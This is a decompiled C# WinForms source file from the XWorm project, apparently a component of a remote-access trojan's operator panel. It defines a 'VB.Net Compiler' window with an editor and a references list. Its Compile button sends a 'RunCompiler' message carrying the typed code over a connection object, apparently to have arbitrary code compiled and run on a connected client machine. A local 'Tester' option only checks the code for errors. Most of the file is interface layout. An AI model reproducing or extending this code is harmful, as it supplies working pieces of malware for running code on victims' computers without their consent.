#define DEBUG
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using FastColoredTextBoxNS;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;


namespace XWorm;

[DesignerGenerated]
public class VBCode : Form
{
    [CompilerGenerated]
    internal sealed class _Closure_0024__R96_002D2
    {
        public GClass5 _0024VB_0024NonLocal_2;

        public _Closure_0024__R96_002D2(_Closure_0024__R96_002D2 arg0)
        {
            if (arg0 != null)
            {
                _0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
            }
        }

        [SpecialName]
        [DebuggerHidden]
        internal void _Lambda_0024__R4(object a0)
        {
            _0024VB_0024NonLocal_2.method_1((byte[])a0);
        }
    }

    private IContainer components;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("ToolStripStatusLabel1")]
    private ToolStripStatusLabel _ToolStripStatusLabel1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("Guna2GradientButton1")]
    private Guna2GradientButton _Guna2GradientButton1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("AddToolStripMenuItem1")]
    private ToolStripMenuItem _AddToolStripMenuItem1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("RemoveToolStripMenuItem1")]
    private ToolStripMenuItem _RemoveToolStripMenuItem1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("CutToolStripMenuItem1")]
    private ToolStripMenuItem _CutToolStripMenuItem1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("CopyToolStripMenuItem1")]
    private ToolStripMenuItem _CopyToolStripMenuItem1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("PasteToolStripMenuItem1")]
    private ToolStripMenuItem _PasteToolStripMenuItem1;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("ToolStripMenuItem7")]
    private ToolStripMenuItem _ToolStripMenuItem7;

    [CompilerGenerated]
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    [AccessedThroughProperty("ErrorTestToolStripMenuItem")]
    private ToolStripMenuItem _ErrorTestToolStripMenuItem;

    public GClass5 gclass5_0;

    [field: AccessedThroughProperty("editor")]
    public FastColoredTextBox editor;

    [field: AccessedThroughProperty("StatusStrip1")]
    public StatusStrip StatusStrip1
    ;

    public ToolStripStatusLabel ToolStripStatusLabel1
    ;

    [field: AccessedThroughProperty("ListBox1")]
    public ListBox ListBox1
    ;

    [field: AccessedThroughProperty("Panel1")]
    public Panel Panel1
    ;

    public System.Windows.Forms.Timer Timer1
    ;

    [field: AccessedThroughProperty("Panel5")]
    public Panel Panel5
    ;

    [field: AccessedThroughProperty("Guna2Panel1")]
    public Guna2Panel Guna2Panel1
    ;

    public Guna2GradientButton Guna2GradientButton1
    ;

    [field: AccessedThroughProperty("Guna2Panel3")]
    public Guna2Panel Guna2Panel3
    ;

    [field: AccessedThroughProperty("Guna2Panel2")]
    public Guna2Panel Guna2Panel2
    ;

    [field: AccessedThroughProperty("Guna2ContextMenuStrip2")]
    public Guna2ContextMenuStrip Guna2ContextMenuStrip2
    ;
    public ToolStripMenuItem AddToolStripMenuItem1
    ;

    public ToolStripMenuItem RemoveToolStripMenuItem1
    ;

    [field: AccessedThroughProperty("Label1")]
    public Label Label1
    ;
    [field: AccessedThroughProperty("Guna2ContextMenuStrip1")]
    public Guna2ContextMenuStrip Guna2ContextMenuStrip2_1
    ;

    public ToolStripMenuItem CutToolStripMenuItem1
    ;

    public ToolStripMenuItem CopyToolStripMenuItem1
    ;

    public ToolStripMenuItem PasteToolStripMenuItem1
    ;
    public ToolStripMenuItem ToolStripMenuItem7
;

    public ToolStripMenuItem ErrorTestToolStripMenuItem
    ;
    public VBCode()
    {
        base.Load += VBCode_Load;
        base.FormClosing += VBCode_FormClosing;
        InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        try
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
        }
        finally
        {
            base.Dispose(disposing);
        }
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            this.editor = new FastColoredTextBoxNS.FastColoredTextBox();
            this.Guna2ContextMenuStrip2_1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.CutToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.CopyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.PasteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.ToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
            this.ErrorTestToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
            this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ListBox1 = new System.Windows.Forms.ListBox();
            this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
            this.AddToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.RemoveToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.Label1 = new System.Windows.Forms.Label();
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.Panel5 = new System.Windows.Forms.Panel();
            this.Guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
            this.Guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            ((System.ComponentModel.ISupportInitialize)(this.editor)).BeginInit();
            this.Guna2ContextMenuStrip2_1.SuspendLayout();
            this.StatusStrip1.SuspendLayout();
            this.Guna2ContextMenuStrip2.SuspendLayout();
            this.Panel1.SuspendLayout();
            this.Panel5.SuspendLayout();
            this.Guna2Panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // editor
            // 
            this.editor.AutoCompleteBracketsList = new char[] {
        '(',
        ')',
        '{',
        '}',
        '[',
        ']',
        '\"',
        '\"',
        '\'',
        '\''};
            this.editor.AutoIndentCharsPatterns = "\r\n^\\s*[\\w\\.\\(\\)]+\\s*(?<range>=)\\s*(?<range>.+)\r\n";
            this.editor.AutoScrollMinSize = new System.Drawing.Size(27, 14);
            this.editor.BackBrush = null;
            this.editor.BracketsHighlightStrategy = FastColoredTextBoxNS.BracketsHighlightStrategy.Strategy2;
            this.editor.CharHeight = 14;
            this.editor.CharWidth = 8;
            this.editor.CommentPrefix = "\'";
            this.editor.ContextMenuStrip = this.Guna2ContextMenuStrip2_1;
            this.editor.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.editor.DisabledColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.editor.Dock = System.Windows.Forms.DockStyle.Fill;
            this.editor.ForeColor = System.Drawing.Color.Black;
            this.editor.IsReplaceMode = false;
            this.editor.Language = FastColoredTextBoxNS.Language.VB;
            this.editor.LeftBracket = '(';
            this.editor.Location = new System.Drawing.Point(0, 32);
            this.editor.Name = "editor";
            this.editor.Paddings = new System.Windows.Forms.Padding(0);
            this.editor.RightBracket = ')';
            this.editor.SelectionColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(255)))));
            this.editor.ServiceColors = null;
            this.editor.Size = new System.Drawing.Size(464, 321);
            this.editor.TabIndex = 5;
            this.editor.Zoom = 100;
            // 
            // Guna2ContextMenuStrip2_1
            // 
            this.Guna2ContextMenuStrip2_1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.CutToolStripMenuItem1,
            this.CopyToolStripMenuItem1,
            this.PasteToolStripMenuItem1,
            this.ToolStripMenuItem7,
            this.ErrorTestToolStripMenuItem});
            this.Guna2ContextMenuStrip2_1.Name = "Guna2ContextMenuStrip2";
            this.Guna2ContextMenuStrip2_1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.Guna2ContextMenuStrip2_1.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
            this.Guna2ContextMenuStrip2_1.RenderStyle.ColorTable = null;
            this.Guna2ContextMenuStrip2_1.RenderStyle.RoundedEdges = true;
            this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(113)))), ((int)(((byte)(74)))), ((int)(((byte)(250)))));
            this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.Guna2ContextMenuStrip2_1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.Guna2ContextMenuStrip2_1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
            this.Guna2ContextMenuStrip2_1.Size = new System.Drawing.Size(119, 114);
            // 
            // CutToolStripMenuItem1
            // 
            this.CutToolStripMenuItem1.BackColor = System.Drawing.Color.White;
            this.CutToolStripMenuItem1.Name = "CutToolStripMenuItem1";
            this.CutToolStripMenuItem1.Size = new System.Drawing.Size(118, 22);
            this.CutToolStripMenuItem1.Text = "[ Cut ]";
            this.CutToolStripMenuItem1.Click += new System.EventHandler(this.CutToolStripMenuItem1_Click);
            // 
            // CopyToolStripMenuItem1
            // 
            this.CopyToolStripMenuItem1.BackColor = System.Drawing.Color.White;
            this.CopyToolStripMenuItem1.Name = "CopyToolStripMenuItem1";
            this.CopyToolStripMenuItem1.Size = new System.Drawing.Size(118, 22);
            this.CopyToolStripMenuItem1.Text = "[ Copy ]";
            this.CopyToolStripMenuItem1.Click += new System.EventHandler(this.CopyToolStripMenuItem1_Click);
            // 
            // PasteToolStripMenuItem1
            // 
            this.PasteToolStripMenuItem1.BackColor = System.Drawing.Color.White;
            this.PasteToolStripMenuItem1.Name = "PasteToolStripMenuItem1";
            this.PasteToolStripMenuItem1.Size = new System.Drawing.Size(118, 22);
            this.PasteToolStripMenuItem1.Text = "[ Paste ]";
            this.PasteToolStripMenuItem1.Click += new System.EventHandler(this.PasteToolStripMenuItem1_Click);
            // 
            // ToolStripMenuItem7
            // 
            this.ToolStripMenuItem7.BackColor = System.Drawing.Color.White;
            this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
            this.ToolStripMenuItem7.Size = new System.Drawing.Size(118, 22);
            this.ToolStripMenuItem7.Text = "[ Clear ]";
            this.ToolStripMenuItem7.Click += new System.EventHandler(this.ToolStripMenuItem7_Click);
            // 
            // ErrorTestToolStripMenuItem
            // 
            this.ErrorTestToolStripMenuItem.BackColor = System.Drawing.Color.White;
            this.ErrorTestToolStripMenuItem.Name = "ErrorTestToolStripMenuItem";
            this.ErrorTestToolStripMenuItem.Size = new System.Drawing.Size(118, 22);
            this.ErrorTestToolStripMenuItem.Text = "[ Tester ]";
            this.ErrorTestToolStripMenuItem.Click += new System.EventHandler(this.ErrorTestToolStripMenuItem_Click);
            // 
            // StatusStrip1
            // 
            this.StatusStrip1.BackColor = System.Drawing.Color.White;
            this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ToolStripStatusLabel1});
            this.StatusStrip1.Location = new System.Drawing.Point(0, 353);
            this.StatusStrip1.Name = "StatusStrip1";
            this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
            this.StatusStrip1.Size = new System.Drawing.Size(610, 22);
            this.StatusStrip1.TabIndex = 6;
            this.StatusStrip1.Text = "StatusStrip1";
            // 
            // ToolStripStatusLabel1
            // 
            this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
            this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
            this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
            this.ToolStripStatusLabel1.Text = "..";
            this.ToolStripStatusLabel1.Visible = false;
            this.ToolStripStatusLabel1.Click += new System.EventHandler(this.ToolStripStatusLabel1_Click);
            // 
            // ListBox1
            // 
            this.ListBox1.BackColor = System.Drawing.Color.White;
            this.ListBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.ListBox1.ContextMenuStrip = this.Guna2ContextMenuStrip2;
            this.ListBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.ListBox1.ForeColor = System.Drawing.Color.Black;
            this.ListBox1.FormattingEnabled = true;
            this.ListBox1.HorizontalScrollbar = true;
            this.ListBox1.Items.AddRange(new object[] {
            "System.dll",
            "Microsoft.VisualBasic.dll",
            "System.Data.dll",
            "System.Windows.Forms.dll",
            "System.Management.dll",
            "System.Drawing.dll"});
            this.ListBox1.Location = new System.Drawing.Point(0, 13);
            this.ListBox1.Name = "ListBox1";
            this.ListBox1.Size = new System.Drawing.Size(146, 308);
            this.ListBox1.TabIndex = 7;
            // 
            // Guna2ContextMenuStrip2
            // 
            this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.AddToolStripMenuItem1,
            this.RemoveToolStripMenuItem1});
            this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
            this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
            this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
            this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
            this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(113)))), ((int)(((byte)(74)))), ((int)(((byte)(250)))));
            this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
            this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(132, 48);
            // 
            // AddToolStripMenuItem1
            // 
            this.AddToolStripMenuItem1.BackColor = System.Drawing.Color.White;
            this.AddToolStripMenuItem1.Name = "AddToolStripMenuItem1";
            this.AddToolStripMenuItem1.Size = new System.Drawing.Size(131, 22);
            this.AddToolStripMenuItem1.Text = "[ Add ]";
            this.AddToolStripMenuItem1.Click += new System.EventHandler(this.AddToolStripMenuItem1_Click);
            // 
            // RemoveToolStripMenuItem1
            // 
            this.RemoveToolStripMenuItem1.BackColor = System.Drawing.Color.White;
            this.RemoveToolStripMenuItem1.Name = "RemoveToolStripMenuItem1";
            this.RemoveToolStripMenuItem1.Size = new System.Drawing.Size(131, 22);
            this.RemoveToolStripMenuItem1.Text = "[ Remove ]";
            this.RemoveToolStripMenuItem1.Click += new System.EventHandler(this.RemoveToolStripMenuItem1_Click);
            // 
            // Panel1
            // 
            this.Panel1.BackColor = System.Drawing.Color.White;
            this.Panel1.Controls.Add(this.ListBox1);
            this.Panel1.Controls.Add(this.Label1);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Right;
            this.Panel1.Location = new System.Drawing.Point(464, 32);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(146, 321);
            this.Panel1.TabIndex = 8;
            // 
            // Label1
            // 
            this.Label1.AutoSize = true;
            this.Label1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Label1.ForeColor = System.Drawing.Color.Black;
            this.Label1.Location = new System.Drawing.Point(0, 0);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(68, 13);
            this.Label1.TabIndex = 8;
            this.Label1.Text = "References :";
            // 
            // Timer1
            // 
            this.Timer1.Enabled = true;
            this.Timer1.Interval = 1000;
            // 
            // Panel5
            // 
            this.Panel5.Controls.Add(this.Guna2Panel1);
            this.Panel5.Controls.Add(this.Guna2Panel3);
            this.Panel5.Controls.Add(this.Guna2Panel2);
            this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel5.Location = new System.Drawing.Point(0, 0);
            this.Panel5.Name = "Panel5";
            this.Panel5.Size = new System.Drawing.Size(610, 32);
            this.Panel5.TabIndex = 31;
            // 
            // Guna2Panel1
            // 
            this.Guna2Panel1.Controls.Add(this.Guna2GradientButton1);
            this.Guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Guna2Panel1.Location = new System.Drawing.Point(68, 0);
            this.Guna2Panel1.Name = "Guna2Panel1";
            this.Guna2Panel1.Size = new System.Drawing.Size(474, 21);
            this.Guna2Panel1.TabIndex = 35;
            // 
            // Guna2GradientButton1
            // 
            this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
            this.Guna2GradientButton1.Image = global::XWorm_Resources.Play;
            this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(15, 15);
            this.Guna2GradientButton1.Location = new System.Drawing.Point(0, 0);
            this.Guna2GradientButton1.Name = "Guna2GradientButton1";
            this.Guna2GradientButton1.Size = new System.Drawing.Size(474, 21);
            this.Guna2GradientButton1.TabIndex = 34;
            this.Guna2GradientButton1.Text = "Compile";
            this.Guna2GradientButton1.Click += new System.EventHandler(this.Guna2GradientButton1_Click);
            // 
            // Guna2Panel3
            // 
            this.Guna2Panel3.Dock = System.Windows.Forms.DockStyle.Left;
            this.Guna2Panel3.Location = new System.Drawing.Point(0, 0);
            this.Guna2Panel3.Name = "Guna2Panel3";
            this.Guna2Panel3.Size = new System.Drawing.Size(68, 32);
            this.Guna2Panel3.TabIndex = 37;
            // 
            // Guna2Panel2
            // 
            this.Guna2Panel2.Dock = System.Windows.Forms.DockStyle.Right;
            this.Guna2Panel2.Location = new System.Drawing.Point(542, 0);
            this.Guna2Panel2.Name = "Guna2Panel2";
            this.Guna2Panel2.Size = new System.Drawing.Size(68, 32);
            this.Guna2Panel2.TabIndex = 36;
            // 
            // VBCode
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(610, 375);
            this.Controls.Add(this.editor);
            this.Controls.Add(this.Panel1);
            this.Controls.Add(this.StatusStrip1);
            this.Controls.Add(this.Panel5);
            this.Name = "VBCode";
            this.Text = "VB.Net Compiler";
            ((System.ComponentModel.ISupportInitialize)(this.editor)).EndInit();
            this.Guna2ContextMenuStrip2_1.ResumeLayout(false);
            this.StatusStrip1.ResumeLayout(false);
            this.StatusStrip1.PerformLayout();
            this.Guna2ContextMenuStrip2.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            this.Panel1.PerformLayout();
            this.Panel5.ResumeLayout(false);
            this.Guna2Panel1.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

    }

    private void CopyToolStripMenuItem1_Click1(object sender, EventArgs e)
    {
        throw new NotImplementedException();
    }

    private void VBCode_Load(object sender, EventArgs e)
    {
        try
        {
            editor.Text = XWorm_Resources.VBCode;
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            Debug.WriteLine(ex.Message);
            ProjectData.ClearProjectError();
        }
    }

    public void method_0(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
    {
        try
        {
            new Dictionary<string, string>().Add("CompilerVersion", "v4.0");
            string compilerOptions = "/target:winexe /platform:anycpu /optimize-";
            CompilerParameters options = new CompilerParameters(referencedAssemblies)
            {
                GenerateExecutable = true,
                GenerateInMemory = true,
                CompilerOptions = compilerOptions,
                TreatWarningsAsErrors = false,
                IncludeDebugInformation = false
            };
            CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, source);
            if (compilerResults.Errors.Count > 0)
            {
                IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
                try
                {
                    if (enumerator.MoveNext())
                    {
                        CompilerError compilerError = (CompilerError)enumerator.Current;
                        MessageBox.Show(compilerError.ErrorText + Environment.NewLine + Conversions.ToString(compilerError.Line), Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                    return;
                }
                finally
                {
                    IDisposable disposable = enumerator as IDisposable;
                    if (disposable != null)
                    {
                        disposable.Dispose();
                    }
                }
            }
            MessageBox.Show("No Error!", Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            MessageBox.Show(ex.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            ProjectData.ClearProjectError();
        }
    }

    private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
    {
        ToolStripStatusLabel1.Visible = false;
        ToolStripStatusLabel1.Text = null;
    }

    private void VBCode_FormClosing(object sender, FormClosingEventArgs e)
    {
        byte[] array = Module0.smethod_6("CloseCompiler");
        GClass5 gClass = gclass5_0;
        ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
        {
            gClass.method_1((byte[])a0);
        }, array);
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!gclass5_0.bool_0)
            {
                Close();
            }
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            Debug.WriteLine(ex.Message);
            ProjectData.ClearProjectError();
        }
    }

    private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        string text = Interaction.InputBox("Add Reference", "References");
        if (!((text.Length == 0) | ListBox1.Items.Contains(text)))
        {
            ListBox1.Items.Add(text);
        }
    }

    private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            Debug.WriteLine(ex.Message);
            ProjectData.ClearProjectError();
        }
    }

    private void Guna2GradientButton1_Click(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrEmpty(editor.Text))
            {
                return;
            }
            string text = null;
            foreach (object item in ListBox1.Items)
            {
                object objectValue = RuntimeHelpers.GetObjectValue(item);
                text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(objectValue, ",")));
            }
            byte[] array = Module0.smethod_6("RunCompiler" + GClass19.string_0 + editor.Text + GClass19.string_0 + text.Trim().TrimEnd(','));
            _Closure_0024__R96_002D2 arg = default(_Closure_0024__R96_002D2);
            _Closure_0024__R96_002D2 CS_0024_003C_003E8__locals0 = new _Closure_0024__R96_002D2(arg);
            CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2 = gclass5_0;
            ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
            {
                CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2.method_1((byte[])a0);
            }, array);
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            MessageBox.Show(ex.Message);
            ProjectData.ClearProjectError();
        }
    }

    private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            editor.Cut();
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            Debug.WriteLine(ex.Message);
            ProjectData.ClearProjectError();
        }
    }

    private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            System.Windows.Forms.Clipboard.SetText(editor.SelectedText);
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            Debug.WriteLine(ex.Message);
            ProjectData.ClearProjectError();
        }
    }

    private void PasteToolStripMenuItem1_Click(object sender, EventArgs e)
    {
        try
        {
            editor.SelectedText = System.Windows.Forms.Clipboard.GetText();
        }
        catch (Exception ex)
        {
            ProjectData.SetProjectError(ex);
            Debug.WriteLine(ex.Message);
            ProjectData.ClearProjectError();
        }
    }

    private void ToolStripMenuItem7_Click(object sender, EventArgs e)
    {
        if (MessageBox.Show("Are You Sure?", "Clear!", MessageBoxButtons.YesNo) == DialogResult.Yes)
        {
            editor.Clear();
        }
    }

    private void ErrorTestToolStripMenuItem_Click(object sender, EventArgs e)
    {
        Dictionary<string, string> providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };
        string text = null;
        foreach (object item in ListBox1.Items)
        {
            object objectValue = RuntimeHelpers.GetObjectValue(item);
            text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(objectValue, ",")));
        }
        method_0(new VBCodeProvider(providerOptions), editor.Text, text.Trim().TrimEnd(',').Split(new string[1] { "," }, StringSplitOptions.RemoveEmptyEntries));
    }
}

